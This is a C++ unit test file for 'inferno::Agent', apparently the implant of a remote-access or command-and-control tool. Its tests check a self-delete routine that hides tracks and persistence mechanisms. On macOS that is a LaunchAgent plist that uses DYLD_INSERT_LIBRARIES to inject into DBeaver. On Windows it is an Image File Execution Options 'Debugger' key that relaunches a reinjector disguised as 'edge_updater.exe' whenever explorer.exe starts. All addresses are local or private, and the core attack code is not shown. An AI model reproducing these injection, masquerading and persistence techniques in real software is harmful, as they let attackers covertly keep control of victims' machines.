#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>

#include "../client/include/Agent.hpp"
#include "../common/include/Packet.hpp"

#include <sys/stat.h>
#ifndef _WIN32
#include <unistd.h>
#endif

#ifdef _WIN32
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#endif

// ── Phase 4C Unit Tests ──────────────────────────────────────────────

void test_self_delete_flag_default_false() {
    inferno::Agent::resetSelfDeleteFlag();
    if (inferno::Agent::wasSelfDeleteCalled()) {
        std::fprintf(stderr, "[FAIL] test_self_delete_flag_default_false: "
                             "flag should be false before first selfDelete()\n");
        std::exit(1);
    }
    std::fprintf(stdout, "[PASS] test_self_delete_flag_default_false\n");
}

void test_self_delete_flag_set_on_call() {
    inferno::Agent::resetSelfDeleteFlag();
    inferno::Agent agent("127.0.0.1", 4242);
    agent.selfDelete();
    if (!inferno::Agent::wasSelfDeleteCalled()) {
        std::fprintf(stderr, "[FAIL] test_self_delete_flag_set_on_call: "
                             "flag should be true after selfDelete()\n");
        std::exit(1);
    }
    std::fprintf(stdout, "[PASS] test_self_delete_flag_set_on_call\n");
}

void test_self_delete_flag_resets() {
    inferno::Agent::resetSelfDeleteFlag();
    inferno::Agent agent("127.0.0.1", 4242);

    // Call once
    agent.selfDelete();
    if (!inferno::Agent::wasSelfDeleteCalled()) {
        std::fprintf(stderr, "[FAIL] test_self_delete_flag_resets: "
                             "flag not set after call\n");
        std::exit(1);
    }

    // Reset and verify
    inferno::Agent::resetSelfDeleteFlag();
    if (inferno::Agent::wasSelfDeleteCalled()) {
        std::fprintf(stderr, "[FAIL] test_self_delete_flag_resets: "
                             "flag not reset\n");
        std::exit(1);
    }

    std::fprintf(stdout, "[PASS] test_self_delete_flag_resets\n");
}

void test_self_delete_skipped_with_empty_binary_path() {
    inferno::Agent::resetSelfDeleteFlag();
    // Agent constructed without binary_path — should be empty
    inferno::Agent agent("127.0.0.1", 4242);
    agent.selfDelete();
    // selfDelete should still set the flag in testing mode
    // (the binary_path guard is bypassed under INFERNO_TESTING)
    if (!inferno::Agent::wasSelfDeleteCalled()) {
        std::fprintf(stderr, "[FAIL] test_self_delete_skipped_with_empty_binary_path: "
                             "flag should be set (INFERNO_TESTING bypasses guard)\n");
        std::exit(1);
    }
    std::fprintf(stdout, "[PASS] test_self_delete_skipped_with_empty_binary_path\n");
}

#ifdef __APPLE__

void test_injected_persistence_macos() {
    // Use a temporary HOME so the test plist doesn't overwrite the real one
    // at ~/Library/LaunchAgents/com.inferno.agent.plist.
    const char* orig_home = ::getenv("HOME");
    std::string tmp_home = std::string("/tmp/inferno_test_home_")
                         + std::to_string(::getpid());
    ::mkdir(tmp_home.c_str(), 0755);
    ::setenv("HOME", tmp_home.c_str(), 1);

    std::string plist_path = tmp_home + "/Library/LaunchAgents/com.inferno.agent.plist";
    ::mkdir((tmp_home + "/Library").c_str(), 0755);
    ::mkdir((tmp_home + "/Library/LaunchAgents").c_str(), 0755);

    const std::string test_target = "/Applications/DBeaver.app/Contents/MacOS/dbeaver";
    inferno::Agent::persistInjectedAgent("127.0.0.1", 4242, test_target);

    FILE* f = ::fopen(plist_path.c_str(), "r");
    if (!f) {
        std::fprintf(stderr, "[FAIL] test_injected_persistence_macos: "
                             "plist not found at %s\n", plist_path.c_str());
        ::setenv("HOME", orig_home ? orig_home : "", 1);
        ::remove(plist_path.c_str());
        ::rmdir((tmp_home + "/Library/LaunchAgents").c_str());
        ::rmdir((tmp_home + "/Library").c_str());
        ::rmdir(tmp_home.c_str());
        std::exit(1);
    }

    std::string content;
    char buf[1024];
    size_t n;
    while ((n = ::fread(buf, 1, sizeof(buf), f)) > 0) {
        content.append(buf, n);
    }
    ::fclose(f);

    // The plist should contain DYLD_INSERT_LIBRARIES (key mechanism),
    // the server IP/port, and the dylib path.
    if (content.find("DYLD_INSERT_LIBRARIES") == std::string::npos) {
        std::fprintf(stderr, "[FAIL] test_injected_persistence_macos: "
                             "plist missing DYLD_INSERT_LIBRARIES\n");
        ::setenv("HOME", orig_home ? orig_home : "", 1);
        std::exit(1);
    }
    if (content.find("INFERNO_SERVER_IP") == std::string::npos ||
        content.find("INFERNO_SERVER_PORT") == std::string::npos) {
        std::fprintf(stderr, "[FAIL] test_injected_persistence_macos: "
                             "plist missing server config\n");
        ::setenv("HOME", orig_home ? orig_home : "", 1);
        std::exit(1);
    }
    if (content.find("127.0.0.1") == std::string::npos) {
        std::fprintf(stderr, "[FAIL] test_injected_persistence_macos: "
                             "plist missing server IP\n");
        ::setenv("HOME", orig_home ? orig_home : "", 1);
        std::exit(1);
    }

    // Restore HOME and clean up temp files
    ::setenv("HOME", orig_home ? orig_home : "", 1);
    ::remove(plist_path.c_str());
    ::rmdir((tmp_home + "/Library/LaunchAgents").c_str());
    ::rmdir((tmp_home + "/Library").c_str());
    ::rmdir(tmp_home.c_str());

    std::fprintf(stdout, "[PASS] test_injected_persistence_macos\n");
}

#endif // __APPLE__

#ifdef _WIN32

#include <cstring>

void test_reinject_config_roundtrip() {
    // Write a config to temp, read it back, verify fields
    char temp_dir[MAX_PATH];
    if (::GetTempPathA(MAX_PATH, temp_dir) == 0) {
        std::fprintf(stderr, "[SKIP] test_reinject_config_roundtrip: "
                             "GetTempPath failed\n");
        return;
    }
    std::string cfg_path = std::string(temp_dir) + "\\reinject_test.cfg";

    // Write
    FILE* f = ::fopen(cfg_path.c_str(), "w");
    if (!f) {
        std::fprintf(stderr, "[SKIP] test_reinject_config_roundtrip: "
                             "fopen write failed\n");
        return;
    }
    std::fprintf(f, "explorer.exe\nC:\\dll\\test.dll\n10.0.0.1\n5555\n");
    ::fclose(f);

    // Read using the same format as reinjectMain
    char line[4096];
    f = ::fopen(cfg_path.c_str(), "r");
    if (!f) {
        std::fprintf(stderr, "[FAIL] test_reinject_config_roundtrip: "
                             "fopen read failed\n");
        ::remove(cfg_path.c_str());
        std::exit(1);
    }

    ::fgets(line, sizeof(line), f); line[std::strcspn(line, "\r\n")] = '\0';
    std::string target_exe = line;
    ::fgets(line, sizeof(line), f); line[std::strcspn(line, "\r\n")] = '\0';
    std::string dll_path = line;
    ::fgets(line, sizeof(line), f); line[std::strcspn(line, "\r\n")] = '\0';
    std::string ip = line;
    ::fgets(line, sizeof(line), f); line[std::strcspn(line, "\r\n")] = '\0';
    uint16_t port = static_cast<uint16_t>(std::atoi(line));
    ::fclose(f);
    ::remove(cfg_path.c_str());

    // Verify
    if (target_exe != "explorer.exe") {
        std::fprintf(stderr, "[FAIL] test_reinject_config_roundtrip: "
                             "target_exe = %s (expected explorer.exe)\n",
                     target_exe.c_str());
        std::exit(1);
    }
    if (dll_path != "C:\\dll\\test.dll") {
        std::fprintf(stderr, "[FAIL] test_reinject_config_roundtrip: "
                             "dll_path mismatch\n");
        std::exit(1);
    }
    if (ip != "10.0.0.1") {
        std::fprintf(stderr, "[FAIL] test_reinject_config_roundtrip: "
                             "ip mismatch\n");
        std::exit(1);
    }
    if (port != 5555) {
        std::fprintf(stderr, "[FAIL] test_reinject_config_roundtrip: "
                             "port = %u (expected 5555)\n", port);
        std::exit(1);
    }

    std::fprintf(stdout, "[PASS] test_reinject_config_roundtrip\n");
}

void test_persistence_windows_registry_key() {
    // Call persistInjectedAgent with a target, verify the IFEO registry key
    // is created under HKCU. The static method uses GetModuleFileNameA internally
    // to locate the current process binary.
    const std::string test_target = "C:\\Windows\\explorer.exe";
    const std::string test_ip = "10.0.0.1";
    const uint16_t test_port = 7777;

    inferno::Agent::persistInjectedAgent(test_ip, test_port, test_target);

    // Verify IFEO key
    HKEY hKey;
    std::string ifeo_key = std::string(
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"
        "Image File Execution Options\\explorer.exe");
    LONG result = ::RegOpenKeyExA(HKEY_CURRENT_USER, ifeo_key.c_str(),
                                  0, KEY_READ, &hKey);
    if (result != ERROR_SUCCESS) {
        std::fprintf(stderr, "[FAIL] test_persistence_windows_registry_key: "
                             "IFEO key not created\n");
        std::exit(1);
    }

    char debugger[MAX_PATH];
    DWORD debugger_size = sizeof(debugger);
    result = ::RegQueryValueExA(hKey, "Debugger", nullptr, nullptr,
                                reinterpret_cast<LPBYTE>(debugger), &debugger_size);
    ::RegCloseKey(hKey);

    if (result != ERROR_SUCCESS) {
        std::fprintf(stderr, "[FAIL] test_persistence_windows_registry_key: "
                             "Debugger value not found\n");
        std::exit(1);
    }
    debugger[debugger_size] = '\0';
    std::string debugger_str(debugger, debugger_size);
    if (debugger_str.find("--reinject") == std::string::npos ||
        debugger_str.find("edge_updater.exe") == std::string::npos) {
        std::fprintf(stderr, "[FAIL] test_persistence_windows_registry_key: "
                             "Debugger value incorrect: %s\n", debugger_str.c_str());
        // Clean up before exit
        std::string cleanup_key = std::string(
            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"
            "Image File Execution Options\\explorer.exe");
        ::RegDeleteKeyA(HKEY_CURRENT_USER, cleanup_key.c_str());
        std::exit(1);
    }

    // Cleanup
    std::string cleanup_key = std::string(
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"
        "Image File Execution Options\\explorer.exe");
    ::RegDeleteKeyA(HKEY_CURRENT_USER, cleanup_key.c_str());

    std::fprintf(stdout, "[PASS] test_persistence_windows_registry_key\n");
}

#endif // _WIN32
